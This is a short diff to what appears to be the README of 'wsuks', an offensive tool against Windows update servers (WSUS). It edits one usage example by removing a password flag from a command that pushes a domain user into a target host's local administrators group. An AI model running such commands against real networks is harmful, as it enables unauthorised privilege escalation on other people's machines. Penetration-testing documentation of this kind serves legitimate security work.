@@ -48,7 +48,7 @@ sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
 ```
 #### Specify known WSUS-Server and add provided domain user to local admin group (Domain is required!):
 ```
-sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local
+sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -d Domain.local
 ```
 #### Autodiscover the WSUS-Server by only specifying the domain user with the dc-ip:
 ```
